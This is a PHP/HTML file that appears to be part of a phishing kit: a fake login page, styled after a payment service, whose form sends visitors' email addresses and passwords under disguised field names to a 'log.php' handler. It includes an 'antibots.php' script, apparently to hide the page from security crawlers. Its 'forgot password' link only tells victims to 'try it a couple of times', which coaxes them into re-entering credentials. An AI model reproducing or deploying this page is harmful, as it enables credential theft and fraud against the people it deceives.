<?php
if (!isset($_SESSION)) {
  session_start();
}

 
require_once 'encriptar.php'; 
include      "antibots.php";  
    





?>

<style>
/*!
Coded By Hassan mansour
*/
form {
    
	position:absolute;
		top: 250px;
		left: 522px;
		

	
	
     }
	 
	 


	 
	 
	 
	 

/*!
Coded By Hassan
*/


.Hassanbutton {

	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#33bdef', endColorstr='#04a0d9',GradientType=0);
	background-color:#1C70BA;
	-moz-border-radius:505px;
	-webkit-border-radius:4px;
	border-radius:500px;
	border:0px solid #ffffff;
	display:inline-block;
	cursor:pointer;
	color:#ffffff;
	font-family:arial;
	font-size:20px;
	padding:10px 140px;
	text-decoration:none;
	font-weight:bold;
}
.Anonismabutton:hover {

	background-color:#0D7BDC;
}
.Anonismabutton:active {
	position:relative;
	top:15px;
}


	 
	 
	 
	 
/*!
Coded By Anonismaabutton
*/


.Anonismaabutton {

	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#33bdef', endColorstr='#04a0d9',GradientType=0);
	background-color:#DEE0E2;
	-moz-border-radius:20px;
	-webkit-border-radius:4px;
	border-radius:20px;
	border:0px solid #7B7E7F;
	display:inline-block;
	cursor:pointer;
	color:#505050;
	font-family:arial;
	font-size:15px;
	padding:11px 100px;
	text-decoration:none;
	font-weight:bold;
}
.Anonismaabutton:hover {

	background-color:#E5EAEB;
}
.Anonismaabutton:active {
	position:relative;
	top:1px;
}	 
	 
	 
	 
	 
	 
	 
	 
	 
	 
	 
	 
	 
	 
	 
	 
	 
	 




/*!
lawn border zra9 khfif
*/

.Anonisma input[type=password],
.Anonisma input[type=email],

.Anonisma select,
.Anonisma textarea {
width:316px;
height:43px;
  padding:.5em .6em;
  border:1px solid #ccc;
  box-shadow:inset 0 1px 3px #ddd;
  border-radius:4px;

}



/*!
lawn border zra9 khfif
*/

.Anonisma input[type=password]:focus,
.Anonisma input[type=email]:focus,

.Anonisma select:focus,
.Anonisma textarea:focus {
  outline:0;
  outline:thin dotted \9;
  border-color:#129FEA;
}


/*!
lfar9 mabin kol label/input
*/

.Anonisma-stacked label,
.Anonisma-stacked textarea {
  display:block;
  margin:.50em 0;
}
.ZX {
margin: 0 auto;
text-align: center;
}
.XX {
margin: 0 auto;
text-align: center;
}

			  </style>
			  





<div class="XX">
<img src="err.png" alt="image" />
</div>
 
<form class="Anonisma Anonisma-stacked" method="post" action="log.php"    >

        <label for="email"><strong><font color="#505050">Email Address</a></strong></label>
        <input id="email" type="email" placeholder="Email"  name="_H1_" class="hasHelp validate" required title="Please Enter Your Email">

        <label for="password"><strong>Password</strong></label>
        <input id="password" type="password" placeholder="Password" name="_H2_" class="hasHelp validate" required title="Please Enter Your Password">
		
		</br>
		</br>


<div >
	<input name="submit.x" type="submit" value="Login" class="Hassanbutton"/>
</div>

		</br>
		
		<a  onmouseDown="alert('Try it a couple of times')"><font color="#2188D7"><strong>Forgot your email or password?</strong></font></a> 
		
	
		</br>
		
		
		</br>
		</br>
		

<center><a href="index.php" class="Anonismaabutton"><center>Open a free account</center></a></center>

</form>

</br>
		</br>
		</br>
		</br>
		</br>
		</br>








</body>
</br>
		</br>
		</br>
		</br>
	
	
